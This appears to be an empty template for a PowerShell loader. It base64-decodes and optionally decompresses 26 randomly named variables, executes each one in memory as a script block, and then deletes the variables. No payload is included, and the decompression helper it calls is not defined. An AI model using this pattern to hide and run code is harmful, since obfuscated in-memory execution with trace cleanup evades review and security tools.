#Requires -Version 2

$Intimacies = ""
$Sordidness = ""
$Decoration = ""
$Apologizes = ""
$Buttresses = ""
$Unknowings = ""
$Recoveries = ""
$Intimidate = ""
$Sourpusses = ""
$Decorously = ""
$Apoplectic = ""
$Bystanders = ""
$Unlicensed = ""
$Recruiting = ""
$Intoxicate = ""
$Spaceships = ""
$Decryption = ""
$Apoplexies = ""
$Cablegrams = ""
$Unnumbered = ""
$Recurrence = ""
$Apollonian = ""
$Consonance = ""
$Megaphoned = ""
$Fastidious = ""
$Inexorable = ""

$Modules = @($Intimacies,$Sordidness,$Decoration,$Apologizes,$Buttresses,$Unknowings,$Recoveries,$Intimidate,$Sourpusses,$Decorously,$Apoplectic,$Bystanders,$Unlicensed,$Recruiting,$Intoxicate,$Spaceships,$Decryption,$Apoplexies,$Cablegrams,$Unnumbered,$Recurrence,$Apollonian,$Consonance,$Megaphoned,$Fastidious,$Inexorable)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Intimacies","Sordidness","Decoration","Apologizes","Buttresses","Unknowings","Recoveries","Intimidate","Sourpusses","Decorously","Apoplectic","Bystanders","Unlicensed","Recruiting","Intoxicate","Spaceships","Decryption","Apoplexies","Cablegrams","Unnumbered","Recurrence","Apollonian","Consonance","Megaphoned","Fastidious","Inexorable") | ForEach-Object { Remove-Variable -Name $_ }
